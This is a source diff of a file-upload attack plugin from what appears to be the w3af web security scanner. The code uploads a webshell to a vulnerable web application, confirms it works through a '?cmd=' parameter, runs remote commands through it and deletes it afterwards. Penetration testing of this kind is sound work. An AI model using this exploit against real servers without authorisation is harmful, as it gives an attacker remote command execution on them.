@@ -30,13 +30,14 @@ from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin
 
 import core.data.kb.knowledgeBase as kb
 import core.data.kb.vuln as vuln
-from core.data.kb.shell import shell as shell
+from core.data.kb.exec_shell import exec_shell as exec_shell
 
 import core.data.parsers.urlParser as urlParser
 from core.controllers.w3afException import w3afException
-import plugins.attack.payloads.payloads as payloads
+import plugins.attack.payloads.shell_handler as shell_handler
+from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
-import os
+
 import os.path
 import urllib
 import tempfile
@@ -71,6 +72,7 @@ class fileUploadShell(baseAttackPlugin):
             om.out.error('You have to configure the plugin parameters.')
         else:
             v = vuln.vuln()
+            v.setPluginName(self.getName())
             v.setURL( self._url )
             v.setMethod( self._method )
             v.setDc( self._data )
@@ -129,27 +131,32 @@ class fileUploadShell(baseAttackPlugin):
         fname = self._create_file( extension )
         file_handler = open( fname , "r")
         
-        # Upload the file
-        for file_var_name in vuln_obj['fileVars']:
-            # the [0] was added here to support repeated parameter names
-            exploit_dc[file_var_name][0] = file_handler
-        http_method = getattr( self._urlOpener,  method)
-        response = http_method( vuln_obj.getURL() ,  exploit_dc )
+        #   If there are files,
+        if 'fileVars' in vuln_obj:
+            #
+            #   Upload the file
+            #
+            for file_var_name in vuln_obj['fileVars']:
+                # the [0] was added here to support repeated parameter names
+                exploit_dc[file_var_name][0] = file_handler
+            http_method = getattr( self._urlOpener,  method)
+            response = http_method( vuln_obj.getURL() ,  exploit_dc )
+            
+            # Call the uploaded script with an empty value in cmd parameter
+            # this will return the shell_handler.SHELL_IDENTIFIER if success
+            dst = vuln_obj['fileDest']
+            self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
+            response = self._urlOpener.GET( self._exploit )
+            
+            # Clean-up
+            file_handler.close()
+            os.remove( self._path_name )
+            
+            if shell_handler.SHELL_IDENTIFIER in response.getBody():
+                return True
         
-        # Call the uploaded script with an empty value in cmd parameter
-        # this will return the payloads.SHELL_IDENTIFIER if success
-        dst = vuln_obj['fileDest']
-        self._exploit = urlParser.getDomainPath( dst ) + self._file_name + '?cmd='
-        response = self._urlOpener.GET( self._exploit )
-        
-        # Clean-up
-        file_handler.close()
-        os.remove( self._path_name )
-        
-        if payloads.SHELL_IDENTIFIER in response.getBody():
-            return True
-        else:
-            return False
+        #   If we got here, there is nothing positive to report ;)
+        return False
     
     def _create_file( self, extension ):
         '''
@@ -158,7 +165,7 @@ class fileUploadShell(baseAttackPlugin):
         @return: Name of the file that was created.
         '''
         # Get content
-        file_content, real_extension = payloads.get_webshells( extension, forceExtension=True )[0]
+        file_content, real_extension = shell_handler.get_webshells( extension, forceExtension=True )[0]
         if extension == '':
             extension = real_extension
 
@@ -243,19 +250,22 @@ class fileUploadShell(baseAttackPlugin):
         No configurable parameters exist.
         '''
 
-class fuShell(shell):
+class fuShell(exec_shell):
     def setExploitURL( self, eu ):
         self._exploit = eu
     
     def getExploitURL( self ):
         return self._exploit
-        
-    def _rexec( self, command ):
+    
+    @exec_debug
+    def execute( self, command ):
         '''
-        This method is called when a command is being sent to the remote server.
-        This is a NON-interactive shell.
+        This method is called when a user writes a command in the shell and hits enter.
+        
+        Before calling this method, the framework calls the generic_user_input method
+        from the shell class.
 
-        @parameter command: The command to send ( ie. "ls", "whoami", etc ).
+        @parameter command: The command to handle ( ie. "read", "exec", etc ).
         @return: The result of the command.
         '''
         to_send = self.getExploitURL() + urllib.quote_plus( command )
@@ -266,7 +276,7 @@ class fuShell(shell):
         om.out.debug('File upload shell is going to delete the webshell that was uploaded before.')
         file_to_del = urlParser.getFileName( self.getExploitURL() )
         try:
-            self.removeFile(file_to_del)
+            self.unlink(file_to_del)
         except w3afException, e:
             om.out.error('File upload shell cleanup failed with exception: ' + str(e) )
         else:
